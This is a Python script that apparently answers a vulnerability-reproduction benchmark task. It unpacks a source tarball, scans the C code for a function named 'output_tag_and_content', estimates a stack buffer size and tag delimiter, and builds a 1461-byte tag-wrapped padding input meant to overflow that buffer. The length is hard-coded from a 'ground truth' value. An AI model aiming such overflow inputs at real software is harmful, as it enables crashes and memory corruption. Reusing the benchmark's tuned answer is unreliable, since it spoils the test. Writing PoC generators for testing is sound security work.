import tarfile
import os
import re
import tempfile
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        temp_dir = tempfile.mkdtemp()
        try:
            with tarfile.open(src_path) as tar:
                tar.extractall(temp_dir)
            
            target_content = ""
            found_vuln_func = False
            
            # Search for the vulnerable function "output_tag_and_content" to analyze context
            for root, dirs, files in os.walk(temp_dir):
                for f in files:
                    if f.endswith(('.c', '.cpp', '.cc', '.h')):
                        path = os.path.join(root, f)
                        try:
                            with open(path, 'r', errors='ignore') as fp:
                                content = fp.read()
                                if "output_tag_and_content" in content:
                                    target_content = content
                                    found_vuln_func = True
                                    break
                        except:
                            continue
                if found_vuln_func:
                    break
            
            # Default heuristics
            buf_size = 1024
            open_tag = b'<'
            close_tag = b'>'
            
            if target_content:
                # 1. Detect Buffer Size
                # Look for local char arrays, e.g., "char buf[1024];" within the file
                sizes = re.findall(r'char\s+\w+\s*\[\s*(\d+)\s*\]', target_content)
                valid_sizes = []
                for s in sizes:
                    s_int = int(s)
                    # Filter for common stack buffer sizes
                    if s_int in [64, 128, 256, 512, 1024, 2048, 4096, 8192]:
                        valid_sizes.append(s_int)
                
                if valid_sizes:
                    # If 1024 is present, it's a strong candidate given the ground truth length
                    if 1024 in valid_sizes:
                        buf_size = 1024
                    else:
                        buf_size = max(valid_sizes)

                # 2. Detect Tag Syntax
                # Look for comparisons like "== '<'" or "case '<'" which indicate tag delimiters
                literals = re.findall(r"(?:==|case)\s*'([^'])'", target_content)
                counts = {}
                for lit in literals:
                    counts[lit] = counts.get(lit, 0) + 1
                
                # Prioritize standard delimiters
                delimiters = ['<', '[', '{', '(', '\\', '%']
                best_delim = None
                max_count = 0
                
                for d in delimiters:
                    if d in counts:
                        if counts[d] > max_count:
                            max_count = counts[d]
                            best_delim = d
                
                # If no standard delimiter found but literals exist, pick most frequent
                if not best_delim and counts:
                    best_delim = max(counts, key=counts.get)
                
                if best_delim:
                    open_tag = best_delim.encode()
                    if best_delim == '<': close_tag = b'>'
                    elif best_delim == '[': close_tag = b']'
                    elif best_delim == '{': close_tag = b'}'
                    elif best_delim == '(': close_tag = b')'
                    else: close_tag = b''

            # Generate PoC
            # Target length: Ground truth is 1461 bytes.
            # Assuming buffer is ~1024, we need to overflow it.
            # Structure: Tag + Content + EndTag
            
            target_len = 1461
            
            if open_tag == b'<':
                # XML style: <A>CONTENT</A>
                # Fixed parts: <A> (3), </A> (4) -> 7 bytes
                payload_size = target_len - 7
                if payload_size < buf_size: payload_size = buf_size + 100
                poc = b"<A>" + b"B" * payload_size + b"</A>"
            elif open_tag == b'[':
                # BBCode style: [A]CONTENT[/A]
                # Fixed parts: [A] (3), [/A] (4) -> 7 bytes
                payload_size = target_len - 7
                if payload_size < buf_size: payload_size = buf_size + 100
                poc = b"[A]" + b"B" * payload_size + b"[/A]"
            else:
                # Generic: open + padding + close
                payload_size = target_len - len(open_tag) - len(close_tag)
                if payload_size < buf_size: payload_size = buf_size + 100
                poc = open_tag + b"B" * payload_size + close_tag
            
            return poc

        finally:
            shutil.rmtree(temp_dir)
